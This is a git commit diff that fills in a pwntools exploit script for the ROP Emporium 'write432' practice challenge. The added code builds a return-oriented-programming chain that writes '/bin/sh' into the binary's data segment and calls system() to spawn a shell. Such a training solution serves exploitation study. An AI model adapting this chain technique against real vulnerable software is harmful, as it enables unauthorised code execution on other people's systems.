1c3b08153a3f55035d88272184a3816b358c94fa
Rob <robert@galvanizedsecurity.com>
2018-02-21 04:13:54 +0000

    write32

--- rop-emporium/write432/write432.py
+++ rop-emporium/write432/write432.py
@@ -9,6 +9,26 @@ gdb_bool = True
 
 def exploit(r):
 
+
+    data_seg = 0x804a028
+    ppr = 0x080486da #pop edi;pop ebp;ret
+    mov_ebp_edi = 0x08048670 #mov [edi],ebp;ret
+    system = 0x804865A
+
+    r.recvuntil("> ")
+    buf = ""
+    buf += "A" * cyclic_find("laaa")
+    buf += p32(ppr)
+    buf += p32(data_seg)
+    buf += "/bin"
+    buf += p32(mov_ebp_edi)
+    buf += p32(ppr)
+    buf += p32(data_seg+4)
+    buf += "/sh\x00"
+    buf += p32(mov_ebp_edi) 
+    buf += p32(system)
+    buf += p32(data_seg)
+    r.sendline(buf)
     r.interactive()
     return
 
@@ -19,7 +39,7 @@ def exploit(r):
 if __name__ == "__main__":
     log.info("For remote %s HOST PORT" % sys.argv[0])
     
-    binary_name = ""        #put binary name here
+    binary_name = "./write432"        #put binary name here
     e = ELF(binary_name)
 
     if len(sys.argv) > 1:
@@ -29,6 +49,7 @@ if __name__ == "__main__":
         r = process(binary_name)
         print util.proc.pidof(r)
         gdb_cmd = [
+            "b *0x804864B",
             "c"
 
 
